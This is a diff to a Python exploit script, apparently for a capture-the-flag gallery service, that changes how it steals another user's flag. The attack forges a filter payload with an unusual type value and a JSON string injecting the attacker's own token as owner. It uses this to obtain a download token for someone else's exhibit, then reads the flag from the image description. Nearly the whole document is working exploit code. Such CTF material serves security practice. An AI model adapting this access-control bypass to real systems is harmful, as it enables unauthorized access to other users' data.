@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+import json
 import sys
 import uuid
 from io import BytesIO
@@ -13,33 +13,21 @@ from PIL import Image
 def main():
     client = Client(IP)
 
-    # region prepare
-
-    secret_artist = client.create_artist(uuid4(), "some_name")
-    barhatnye_tyagi = client.create_sneakers(FLAG_ID, secret_artist["token"]["value"])
-
-    # endregion
-
-    public_id = barhatnye_tyagi["id"]["value"]
-
     hacker = client.create_artist(uuid4(), "hacker_name")
     hacker_token = hacker["token"]["value"]
 
-    content = "{" + "\"OwnerToken\": " + "{" + f"\"Value\":\"{hacker_token}\"" + "}" + "}"
-    filter_payload = {"Type": "-100500", "JsonString": content}
-
+    content = {"OwnerToken": {"Value": f"{hacker_token}"}}
+    filter_payload = {"Type": "-100500", "JsonString": json.dumps(content)}
     hacker_filters = [filter_payload, filter_payload]
-    ids_to_show = [{"Value": public_id}]
+
+    ids_to_show = [{"Value": PUBLIC_FLAG_ID}]
     exhibits_with_secret = client.gallery_exhibits(hacker_filters, ids_to_show, hacker_token)
-
     download_token = exhibits_with_secret["items"][0]["downloadToken"]["value"]
-    barhatnye_tyagi_content = client.gallery_show(download_token)
 
-    potential_flag = extract_description(barhatnye_tyagi_content)
-    if potential_flag == FLAG_ID:
-        print(f"CONGRATS! Your reached the flag: {potential_flag}")
-    else:
-        raise Exception("smth went wrong :(")
+    barhatnye_tyagi_content = client.gallery_show(download_token)
+    flag = extract_description(barhatnye_tyagi_content)
+
+    print(f"CONGRATS! Your reached the flag: {flag}")
 
 
 def extract_description(image_content_bytes) -> str:
@@ -94,7 +82,7 @@ def iterative_main():
 
 
 IP = sys.argv[1] if len(sys.argv) > 1 else "localhost"
-FLAG_ID = sys.argv[2] if len(sys.argv) > 2 else f"{uuid4()}"
+PUBLIC_FLAG_ID = sys.argv[2] if len(sys.argv) > 2 else f"{uuid4()}"
 
 if __name__ == '__main__':
     iterative_main()
